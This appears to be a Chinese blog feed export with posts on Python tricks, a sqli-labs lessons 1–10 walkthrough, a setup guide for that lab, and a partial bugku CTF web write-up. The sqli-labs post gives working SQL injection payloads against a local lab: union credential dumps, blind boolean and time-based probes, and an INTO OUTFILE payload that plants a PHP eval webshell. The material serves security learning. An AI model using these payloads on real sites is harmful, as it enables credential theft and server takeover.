    <content><![CDATA[<h3 id="1-将电脑变成服务器"><a href="#1-将电脑变成服务器" class="headerlink" title="1. 将电脑变成服务器"></a>1. <font color="orang">将电脑变成服务器</font></h3><p>&nbsp;&nbsp; &nbsp;&nbsp;如果要将电脑中的文件发到手机上面，你会选择怎么做呢？数据线、微信文件助手。这些都有局限性，比如突然断网，WTF？别急，万能的python自有妙招。</p>
<ul>
<li><p>命令：<font color="orane">python -m SimpleHTTPServer 8000</font></p>
</li>
<li><p>然后查看本机IP，在手机端访问8000端口 (需要与电脑端的Ip相同)</p>
 <div align="center"><img height="300px" width="400px" src="https://img-blog.csdnimg.cn/20200208170725351.png"></div>
<span id="more"></span>‘
 <div align="center"><img height="300px" width="350px" src="https://img-blog.csdnimg.cn/20200208170757109.png"></div>
 nice!!! 支持在线浏览和下载，简直不要太方便。吹爆此功能。
 <br/><br/></li>
</ul>
<h3 id="2-截图翻译"><a href="#2-截图翻译" class="headerlink" title="2. 截图翻译"></a>2. <font color="orang">截图翻译</font></h3><p>&nbsp;&nbsp; &nbsp;&nbsp;我们经常遇到英文不会翻译，但是文字又不能复制的情况。针对这种情况，可以用python编写一个程序实现截图翻译的功能。具体步骤如下：</p>
<ul>
<li>安装<font color="orange"> Tesseract-OCR </font></li>
</ul>
<div align="center"><img width="550" src="https://img-blog.csdnimg.cn/20200704182137448.png"></div>

<ul>
<li>代码实现见 <a href="https://github.com/lemon-l/Python-beginner/tree/master/%E5%AE%9E%E6%88%98/Screenshot_translation">github</a>,其中包括最后打包好的程序。这里运行程序会报错，需要找到python安装路径下的pytesseract，然后将tesseract_cmd = ‘tesseract’改为tesseract_cmd = ‘填Tesseract-OCR的安装路径’</li>
<li>将代码用pyinstaller打包成.exe程序。具体操作为：截取含有英文的图片 -&gt; 回车，然后出现中文翻译结果。运行时截到的图片会自动保存在与exe同一目录下</li>
</ul>
<div align="center"><img width="600" src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/20200704181806.png"></div>

<h3 id="3-‘字符雨’特效"><a href="#3-‘字符雨’特效" class="headerlink" title="3.  ‘字符雨’特效"></a>3.  <font color="orang">‘字符雨’特效</font></h3><p>&nbsp;&nbsp; &nbsp;&nbsp;相信很多人都看过黑客帝国这部电影，一提到它我们会想到经典的“子弹时间”，但是里面的“字符雨”也是让人难以忘怀。接下来我们就来用python来实现里面的这个特效吧！</p>
<p>&nbsp;&nbsp; &nbsp;&nbsp;用户will8211在github上面上传了unimatrix这个项目，操作方法如下：</p>
<ul>
<li>在linux系统里面克隆这个项目 <code>pip install git+https://github.com/will8211/unimatrix.git</code></li>
<li>按照项目里面Manual进行操作(在终端里面运行)<br>&nbsp;&nbsp; &nbsp;&nbsp;这是我运行示例的结果，简直太炫了：</li>
</ul>
<div align="center"><font color="blue" size=5>unimatrix -c green -u 'Matrix'</font></div>
<div align="center"><img width="550" src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/mygif2(1).gif"></div>

<div align="center"><font color="blue" size=5>unimatrix -c yellow -l 'e'</font></div>
<div align="center"><img width="550" src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/mygif5.gif"></div>


<h3 id="4-转动微信地图"><a href="#4-转动微信地图" class="headerlink" title="4.  转动微信地图"></a>4.  <font color="orang">转动微信地图</font></h3><p>&nbsp;&nbsp; &nbsp;&nbsp;启动微信的那一刻，我们往往会看到张小龙（微信创始人）眺望着地球，但你是否有想过将它面前的地球转动起来，下面我们来完成此操作。</p>
<ul>
<li>准备素材：地球表面素材；云图素材；微信地球的抠图素材</li>
<li>Gif压缩：<a href="https://www.iloveimg.com/zh-cn/compress-image/compress-gif">https://www.iloveimg.com/zh-cn/compress-image/compress-gif</a></li>
<li>完整代码：<a href="https://alltodata.cowtransfer.com/s/afc708b596774f">https://alltodata.cowtransfer.com/s/afc708b596774f</a></li>
</ul>
<p>效果图：</p>
<div align="center"><img width="220" height="400" src="https://cdn.jsdelivr.net/gh/lemon-l/Imageshack/Image/earth.gif"></div>

<p>参考链接：<a href="https://mp.weixin.qq.com/s/ayKCLWXWjjpvlpzqcv3pgA">https://mp.weixin.qq.com/s/ayKCLWXWjjpvlpzqcv3pgA</a></p>
<h3 id="5-二维码生成器"><a href="#5-二维码生成器" class="headerlink" title="5.  二维码生成器"></a>5.  <font color="orang">二维码生成器</font></h3><ul>
<li>首先安装myqr库  <code>pip3 install myqr</code></li>
<li>常规链接二维码生成</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> MyQR <span class="keyword">import</span> myqr</span><br><span class="line">myqr.run(<span class="string">&#x27;https://www.bilibili.com/video/BV1WZ4y1H7Th/&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>图片链接二维码生成<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> MyQR <span class="keyword">import</span> myqr</span><br><span class="line">myqr.run(<span class="string">&#x27;https://www.bilibili.com/video/BV1WZ4y1H7Th/&#x27;</span>, picture=<span class="string">&#x27;2.jpg&#x27;</span>, colorized=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<div align="center"><img width="400" height="400" src="https://img-blog.csdnimg.cn/20200706082003277.png"></div>

<ul>
<li>动态链接二维码生成</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> MyQR <span class="keyword">import</span> myqr</span><br><span class="line">myqr.run(<span class="string">&#x27;https://www.bilibili.com/video/BV1WZ4y1H7Th/&#x27;</span>,</span><br><span class="line">         picture=<span class="string">&#x27;mygif3.gif&#x27;</span>,</span><br><span class="line">         colorized=<span class="literal">True</span>,</span><br><span class="line">         save_name=<span class="string">&quot;动态qr.gif&quot;</span>)</span><br></pre></td></tr></table></figure>

<div align="center"><img width="400" height="400" src="https://img-blog.csdnimg.cn/20200706082725679.gif"></div>

<h3 id="6-Free-Python-Games"><a href="#6-Free-Python-Games" class="headerlink" title="6.  Free Python Games"></a>6.  <font color="orang">Free Python Games</font></h3><p>这个python项目实现经典的贪吃蛇、迷宫、扫雷、Flappy Bird游戏只需要简单的50-100行代码，对于新手来说是一个很好的python学习、锻炼探索和理解能力的工具。另外，如果你仅仅只是为了玩而玩，只需要简单的安装就可以在电脑上玩这些经典游戏了。</p>
<ul>
<li>安装  <code>python3 -m pip install freegames </code></li>
<li>游戏列表 <code>python3 -m freegames list</code></li>
<li>打开游戏 <code>python3 -m freegames.snake</code></li>
</ul>
<p>项目地址：<a href="http://www.grantjenks.com/docs/freegames/">http://www.grantjenks.com/docs/freegames/</a></p>
<p><font color="red">持续更新中……</div></p>
]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs (1-10)</title>
    <url>/2020/01/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/</url>
    <content><![CDATA[<p>[学习链接]：<a href="https://www.bilibili.com/video/av66072415">https://www.bilibili.com/video/av66072415</a></p>
<p><font color='blue' size=4>MySQL简单基本用法</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用的几个函数：</span><br><span class="line">        system_user() —— 系统用户</span><br><span class="line">        user() —— 普通用户</span><br><span class="line">        current_user() —— 当前用户</span><br><span class="line">        database() —— 当前所用的数据库</span><br><span class="line">        version() —— 数据库的版本</span><br><span class="line">        @@datadir —— 安装路径</span><br><span class="line">        @@version_compile_os —— 本机系统</span><br></pre></td></tr></table></figure>

<p>假定：数据库名-security，表名-users</p>
<ul>
<li><p>查库：select schema_name from information_schema.schemata</p>
</li>
<li><p>查表：select table_name from information_schema.tables where table_schema=’security’</p>
</li>
<li><p>查列：select column_name from information_schema.columns where table_name=’users’</p>
</li>
<li><p>查字段： select username,password from security.users</p>
</li>
</ul>
<h4 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h4><p>构造payload: <a href="http://127.0.0.1/sqli/Less-1/?id=1">http://127.0.0.1/sqli/Less-1/?id=1</a></p>
<p>得到 name:Dumb, password:Dumb</p>
<p>—— 当然，可以改变后面id的值，会得到不同的name和password</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. # 其中limit后面的第一位(0)表示从第几个开始，第二位表示显示多少个数据(1)</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1</span><br><span class="line">    得到的SQL语句为：select * from users where id=&#x27;1&#x27; limit 0,1 </span><br><span class="line">    </span><br><span class="line">2. # A and B —— 当A和B都为1时，结果为true; A or B —— A、B任何一个为1，结果都为true</span><br><span class="line">   # --+  # -- 都表示注释符</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1&#x27; or 1=1--+</span><br><span class="line">    得到的SQL语句为：SELECT * FROM users WHERE id=&#x27;1&#x27; or 1=1-- &#x27; LIMIT 0,1</span><br><span class="line">    </span><br><span class="line">3. # orber by 表示对表中的某个字段进行排序</span><br><span class="line">   # 通过order by 语句可以确定数据列数，本题包含id在内有3个字段</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1&#x27; order by 1--+</span><br><span class="line">    得到sql语句为：SELECT * FROM users WHERE id=&#x27;1&#x27; order by 1-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">4. # 联合查询union的作用是将两个select查询结果和并</span><br><span class="line">   # 通过将id改为-1，判断显示的内容在数据库的第几列</span><br><span class="line">   # 得到login name在第2列，Password在第3列</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,3--+</span><br><span class="line">   得到sql语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,3-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">5. # 选3的位置作为回显位置，获取username或者password</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,schema_name from information_schema.schemata limit 0,1--+</span><br><span class="line">   得到SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,schema_name from information_schema.schemata LIMIT 0,1-- &#x27; LIMIT 0,1</span><br><span class="line">   </span><br><span class="line">6. # group_concat(),可以将所有的数据拼接在一行显示  		    </span><br><span class="line">   # 详情見本链接 https://www.yiibai.com/mysql/group_concat.html</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">   得到的SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata limit 0,1-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">7. # 得到表信息, emails,referers,uagents,users</span><br><span class="line">   # 但是后面的security两边的引号较为危险，推荐将其改为十六进制的形式</span><br><span class="line">   # 即为：table_schema=0x7365637572697479</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">    得到的SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">8. # 得到列信息：id,username,password</span><br><span class="line">   # 16进制为：0x7573657273</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">   得到的SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">9. # 得到password：Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(password) from security.users--+</span><br><span class="line">    得到SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(password) from security.users-- &#x27; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">10. # concat_ws()函数能将username和password同时取出，用‘-’连接</span><br><span class="line">    # 推荐将连接符号‘-’转换为16进制，0x2D</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(concat_ws(&#x27;-&#x27;,username,password)) from security.users--+</span><br><span class="line">    得到的SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(concat_ws(&#x27;-&#x27;,username,password)) from security.users-- &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>步骤总结：</p>
<ol>
<li><p><font color='red'>查看是否有注入</font></p>
</li>
<li><p><font color='red'>查看有多少列</font></p>
</li>
<li><p><font color='red'>查看哪些数据可以回显</font></p>
</li>
<li><p><font color='red'>查看当前数据库</font></p>
</li>
<li><p><font color='red'>查看所有的数据库</font></p>
</li>
<li><p><font color='red'>查看所有的表</font></p>
</li>
<li><p><font color='red'>查看所有的字段</font></p>
</li>
<li><p><font color='red'>得到所有的账号和密码</font></p>
<div align='center'><img width='500' hight='300' src='https://img-blog.csdnimg.cn/2020012418114762.png'></div></li>
</ol>
<h4 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h4><p>​    id=1’时报错，则存在sql注入，此时发现引号是多余的。</p>
<p>​    模版为 <a href="http://127.0.0.1/sqli/Less-2/?id=-1%EF%BC%88%E6%AD%A4%E4%B8%BA%E8%A6%81%E6%9E%84%E9%80%A0%E7%9A%84%EF%BC%89--+">http://127.0.0.1/sqli/Less-2/?id=-1（此为要构造的）--+</a></p>
<p>​    按照步骤得到正确答案。</p>
<h4 id="Less-03"><a href="#Less-03" class="headerlink" title="Less-03"></a>Less-03</h4><p>​    id=1’时报错，存在sql注入，此时发现引号、右括号是多余的</p>
<p>​    模板为 <a href="http://127.0.0.1/sqli/Less-3/?id=1&#39;">http://127.0.0.1/sqli/Less-3/?id=1&#39;</a>) (此为要构造的) –+</p>
<p>​    按照步骤得到正确答案</p>
<h4 id="Less-04"><a href="#Less-04" class="headerlink" title="Less-04"></a>Less-04</h4><p>​    id=1”时报错，存在sql注入，此时发现引号、右括号是多余的</p>
<p>​    模板为 <a href="http://127.0.0.1/sqli/Less-4?id=1&quot;">http://127.0.0.1/sqli/Less-4?id=1&quot;</a>) (此为要构造的) –+ </p>
<p>​    按照步骤得到正确答案</p>
<h4 id="Less-05"><a href="#Less-05" class="headerlink" title="Less-05"></a>Less-05</h4><p>​    难度正式加大了。</p>
<p>​    <font color='ligreen'><b>基础知识补充：</b></font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. left()函数 —— left(a,b)从左侧截取a的前b位，正确返回1，错误返回0</span><br><span class="line">    例：select left(database(),1)=&#x27;s&#x27;; —— 前1位是否为s</span><br><span class="line"></span><br><span class="line">2. regexp函数 —— 正则表达式匹配</span><br><span class="line">    例：select database() regexp &#x27;s&#x27;; —— 匹配第一个字符是否为s</span><br><span class="line"></span><br><span class="line">3. like函数 —— 模糊正则匹配</span><br><span class="line">    例：select database() like &#x27;s%&#x27;; —— 匹配第一个字符是否为s</span><br><span class="line"></span><br><span class="line">4. substr(a,b,c) —— 从位置b开始，截取a字符串c位长度</span><br><span class="line">    例：select substr((select database(),1,1))=&#x27;s&#x27;; —— 匹配第一个字符是否为s</span><br><span class="line">        select substr((select database(),1,3))=&#x27;sec&#x27;; —— 匹配前3个字符是否为sec</span><br><span class="line"></span><br><span class="line">5. ascii() —— 将某个字符串转化为ascii值</span><br><span class="line">    例：select ascii(substr(select database()),1,1); —— 回显115或者：</span><br><span class="line">        select ascii(substr(select database(),1,1))&gt;110 —— 如果大于110，返回1，否则返回0</span><br><span class="line"></span><br><span class="line">6. chr(&#x27;数字&#x27;) 或者 ord(&#x27;字母&#x27;) —— 使用python中的两个函数可以判断当前的ascii值是多少</span><br><span class="line"></span><br><span class="line">7. length() —— 判断长度</span><br></pre></td></tr></table></figure>

<p>​    当id=1时，显示<font color='purple'><b>  You are in……</b></font>;当id值大于12时，没有任何的显示。这就是典型的<font color='red'>  布尔盲注</font></p>
<p>​    布尔盲注：一般是在网页没有报错、回显的时候使用。只能对url输入的判断一个对错，一般只能判断一个英文字符。</p>
<div align='center'><img width=500 height=550 src='https://img-blog.csdnimg.cn/20200127195420602.png'></div>

<p>​    id=1’时报错，存在sql注入。可以知道正确的情况下会显示 <font color='purple'><b>  You are in……</b></font>按照之前的步骤可以判断此为3列，接下来判断数据库名之类的就要用到上面的补充知识了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. # 求当前数据库名的长度</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())=8--+</span><br><span class="line"></span><br><span class="line">2. # 判断数据库名的第一个字符</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;s&#x27;--+</span><br><span class="line">   # 接下来判断数据库名的其他位</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and left((select database()),2)=&#x27;c&#x27;--+</span><br><span class="line"></span><br><span class="line">   # 手工一个一个排查十分的麻烦，这个时候可以将burpsuit派上用场，直接爆破，或者写脚本完成</span><br><span class="line">   -----------------------------------------------------------------------------------------</span><br><span class="line">   # 或者使用if来进行判断测试,二分法测试，减少了时间</span><br><span class="line">   # 下面的方法select database()会出现bug，因为MySQL里面的数据库为NULL，所以无论后面的数字为多大，永远都显示 You are in ……</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select database()),1,1))&gt;110--+ </span><br><span class="line"></span><br><span class="line">   # 此种方法可以避免bug,limit 1(表示选择第几个数据库),1</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;110--+ </span><br><span class="line">   依次类推，得到所有的数据库</span><br><span class="line">   </span><br><span class="line">3. # 爆security中的表名</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;110--+</span><br><span class="line">   # 判断是否存在表</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select group_concat(table_name) from information_schema.tables where table_schema=‘security’ )–+</span><br><span class="line">    依次类推，得到所有的表</span><br><span class="line"> 	</span><br><span class="line">4. # 爆字段名</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+ </span><br><span class="line">    依次类推，得到users的表username，password的值</span><br><span class="line"></span><br><span class="line">5. # 爆字段内的值</span><br><span class="line">    http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select username from security.users limit 1,1),1,1))=65--+</span><br></pre></td></tr></table></figure>

<h4 id="Less-06"><a href="#Less-06" class="headerlink" title="Less-06"></a>Less-06</h4><p>​    id=1” 时报错，存在sql注入</p>
<p>​    模板为 <a href="http://127.0.0.1/sqli/Less-3/?id=1&quot;">http://127.0.0.1/sqli/Less-3/?id=1&quot;</a> (此为要构造的) –+</p>
<p>​    按照第五关步骤得到正确答案</p>
<h4 id="Less-07"><a href="#Less-07" class="headerlink" title="Less-07"></a>Less-07</h4><p>​    <font color='ligreen'><b>基础知识补充：</b></font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. show variables like &#x27;%secure%&#x27;;查看secure-file-priv当前的值，如果显示为NULL，则需要打开C:\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure-file-priv=&quot;/&quot;</span><br><span class="line">    # 这一步实在解决不了就参考https://blog.csdn.net/qq_31518899/article/details/75662090</span><br><span class="line">    </span><br><span class="line">2. 一句话木马：PHP版本：&lt;?php @eval($_POST[&quot;hacker&quot;]);?&gt; 其中hacker为密码</span><br><span class="line"></span><br><span class="line">3. load_file() 读取本地文件 select load_file(&#x27;C:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test1.txt&#x27;);</span><br><span class="line"></span><br><span class="line">4. into outfile 写文件 </span><br><span class="line">   用法：select &#x27;php is the best language&#x27; into outfile &#x27;test1.txt&#x27;;</span><br><span class="line">   文件位置：C:\phpStudy\PHPTutorial\MySQL\data</span><br><span class="line">   —————————————————————————————————————————————————————————————————————————</span><br><span class="line">   或者是：</span><br><span class="line">   用法：select &#x27;crow 666&#x27; into outfile &#x27;C:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test1.txt&#x27;;</span><br><span class="line">   文件位置：C:\phpStudy\PHPTutorial\WWW\sqli\Less-7</span><br></pre></td></tr></table></figure>

<ul>
<li>当 id=1 时，显示  <font color='purple'><b>  You are in…… Use outfile……</b></font>；直接加单引号 id=1’,显示 <font color='purple'><b>  You have an error in your SQL syntax</b></font>, 则存在SQL注入</li>
<li>注入模版为 <a href="http://127.0.0.1/sqli/Less-7/?id=1%E2%80%98">http://127.0.0.1/sqli/Less-7/?id=1‘</a>)) (要构造的)–+</li>
<li>根据提示，会用到outfile函数，可以构造payload: <a href="http://127.0.0.1/sqli/Less-7/?id=1&#39;">http://127.0.0.1/sqli/Less-7/?id=1&#39;</a>)) union select 1,2,’<?php @eval($_POST["hacker"]);?>‘ into outfile ‘C:\phpStudy\PHPTutorial\WWW\sqli\Less-7\test1.php’–+ </li>
<li>访问 <a href="http://127.0.0.1/sqli/Less-7/test1.php%EF%BC%8C%E6%98%BE%E7%A4%BA">http://127.0.0.1/sqli/Less-7/test1.php，显示</a> <font color='#ffe8b6'> 1    Dumb    Dumb 1    2</font></li>
<li>写入了一句话木马后，用中国菜刀访问，此时hacker为密码,成功拿到网站的webshell</li>
</ul>
<h4 id="Less-08"><a href="#Less-08" class="headerlink" title="Less-08"></a>Less-08</h4><p>​    id=1’时 <font color='purple'><b>  You are in……</b></font>消失，则存在sql注入。</p>
<p>​    模版为 <a href="http://127.0.0.1/sqli/Less-2/?id=1&#39;%EF%BC%88%E6%AD%A4%E4%B8%BA%E8%A6%81%E6%9E%84%E9%80%A0%E7%9A%84%EF%BC%89--+">http://127.0.0.1/sqli/Less-2/?id=1&#39;（此为要构造的）--+</a></p>
<p>​    按照第5关的步骤得到正确答案。</p>
<h4 id="Less-09"><a href="#Less-09" class="headerlink" title="Less-09"></a>Less-09</h4><p><font color='ligreen'><b>基础知识补充：</b></font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. if(condition,A,B) —— 如果条件condition为true,则执行语句A，否则执行B</span><br><span class="line">    例： select if(1&gt;2,4,5);返回的结果为5(如果在mysql命令行中使用，首先要use xxx数据库才行)</span><br><span class="line"> </span><br><span class="line">2. sleep() 休眠多长时间</span><br><span class="line"></span><br><span class="line">3. # 使用时间延迟的方法判断是否存在注入漏洞</span><br><span class="line">    http://127.0.0.1/sqli/Less-9/?id=1&#x27; and sleep(5)--+ </span><br><span class="line"></span><br><span class="line">4. # 当为8的时候很快加载，为其他值的时候加载较慢（延迟5秒左右），那就说明此时数据库的长度为8(security)</span><br><span class="line">    http://127.0.0.1/sqli/Less-9/?id=1&#x27; and if(length(database())=8,1,sleep(5))--+ </span><br><span class="line">	</span><br><span class="line">5. # 如果当前数据库的第一个字母的ascii值大于113的时候立即返回结果，否则执行5秒</span><br><span class="line">    http://127.0.0.1/sqli/Less-9/?id=1&#x27; and if(ascii(substr((select database()),1,1))&gt;113,1,sleep(5))--+ </span><br><span class="line">	</span><br><span class="line">6. # 同理哦安短数据库中的第五个数据库的第一位的ascii是否大于112</span><br><span class="line">    http://127.0.0.1/sqli/Less-9/?id=1&#x27; and if(ascii(substr((select schmea_name from information_schema.schemata limit 4,1),1,1))&gt;113,1,sleep(5))--+ </span><br><span class="line">	</span><br><span class="line">7. 其余步骤基本相似，可以采用burpsuit或者是sql盲注的脚本使用 </span><br><span class="line">   了解一下DNSlog</span><br></pre></td></tr></table></figure>

<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>​    <a href="http://127.0.0.1/sqli/Less-10/?id=1&quot;">http://127.0.0.1/sqli/Less-10/?id=1&quot;</a> and sleep(5)–+ 只是将less-9中的单引号换成了双引号，其余均相同。</p>
<p><strong>注意</strong>：一般情况下，测试有六种方法：</p>
<ul>
<li>‘  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   单引号</li>
<li>‘)  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    单引号、括号</li>
<li>‘)) &nbsp;&nbsp;&nbsp;&nbsp;    单引号、双括号</li>
<li>“   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    双引号</li>
<li>“)  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    双引号、括号</li>
<li>“)) &nbsp;&nbsp;&nbsp;&nbsp;   双引号、双括号</li>
</ul>
]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs环境配置</title>
    <url>/2020/01/22/sqli-labs%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>本操作于虚拟机中进行(windows7系统)</p>
<ul>
<li><p>sqli-labs下载：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a> (直接克隆 git clone + 网址)</p>
</li>
<li><p>phpstudy下载地址：<a href="http://down.php.cn/PhpStudy20180211.zip">http://down.php.cn/PhpStudy20180211.zip</a> (不是最新版本)<br> 启动phpstudy，</p>
 <div align = "center"><img src="https://img-blog.csdnimg.cn/20200122122024972.png" width="400" hegiht="130" ></div>
<span id="more"></span>
​    当浏览器访问127.0.0.1，显示Hello World时，表明phpstudy安装成功。</li>
</ul>
<p>​    在phpstudy中，选择其它选项里面的网站根目录，进入www，将下载好的sqli-labs复制进此目录，然后访问127.0.0.1/sqli-labs, 显示</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/2020012212085951.png" width="400" hegiht="130" ></div>

<p>​接下来就是配置数据库了，进入sqli-labs\sql-connections\db-creds.inc 目录，修改$dbpass = ‘root’或者其他你想要的密码，保存，访问<a href="http://127.0.0.1/sqli-labs/sql-connections/setup-db.php">http://127.0.0.1/sqli-labs/sql-connections/setup-db.php</a></p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20200122121142893.png" width="400" hegiht="130" ></div>

<p>进行第一关测试，根据提示构造payload，访问<a href="http://127.0.0.1/sqli/Less-1/?id=1">http://127.0.0.1/sqli/Less-1/?id=1</a></p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20200122121127372.png" width="400" hegiht="130" ></div>

<p>至此，环境配置完毕，可以进行学习了。</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku - Web（1~20）</title>
    <url>/2019/11/23/bugku-Web%EF%BC%881-20%EF%BC%89/</url>
    <content><![CDATA[<p><font color="red" size="5">刚入门ctf，望各位大佬指教</font></p>
<h2 id="1-web2"><a href="#1-web2" class="headerlink" title="1.web2"></a>1.<a href="http://123.206.87.240:8002/web2/">web2</a></h2><p>这题直接右击查看页面源代码即可</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190906094958507.png" width="300" hegiht="113" ></div>

<h2 id="2-计算器"><a href="#2-计算器" class="headerlink" title="2.计算器"></a>2.<a href="http://123.206.87.240:8002/yanzhengma/">计算器</a></h2><p>在文本框内发现只能输入一位数字，在框内右击-查看元素，发现“maxlength=1”,将其值改为较大的，然后在框内输入正确的值，点击验证，出现flag。</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190906095732881.png" width="300" hegiht="113" ></div>


<span id="more"></span>

<h2 id="3-web基础-GET"><a href="#3-web基础-GET" class="headerlink" title="3.web基础$_GET"></a>3.<a href="http://123.206.87.240:8002/get/">web基础$_GET</a></h2><p>由题分析，what = flag的时候，会出现flag，重新构造网址：<br><a href="http://123.206.87.240:8002/get/?what=flag">http://123.206.87.240:8002/get/?what=flag</a>, 页面上面显示  </p>
<div align = "center"><img src="https://i.loli.net/2019/09/03/91bOzRNmfpUkWIK.png" width="300" hegiht="113" ></div>

<h2 id="4-web基础-POST"><a href="#4-web基础-POST" class="headerlink" title="4.web基础$_POST"></a>4.<a href="http://123.206.87.240:8002/post/">web基础$_POST</a></h2><p>分析可知，这题与上面的极为相似（在火狐浏览器附加组件中下载hackbar，在页面右击查看元素可找到hackbar）<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDkvMDMvUHVSNTE2c2N4RGZYMm9NLnBuZw?x-oss-process=image/format,png" alt="TIM截图20190903131606.png"><br>页面显示</p>
<div align = "center"><img src="https://i.loli.net/2019/09/03/iARCauhSHObIkj3.png"  width="300" hegiht="113"></div>

<h2 id="5-矛盾"><a href="#5-矛盾" class="headerlink" title="5.矛盾"></a>5.<a href="http://123.206.87.240:8002/get/index1.php">矛盾</a></h2><p>此题需要搞清楚php中=== 和 ==的区别（===会比较两个变量的类型和值</p>
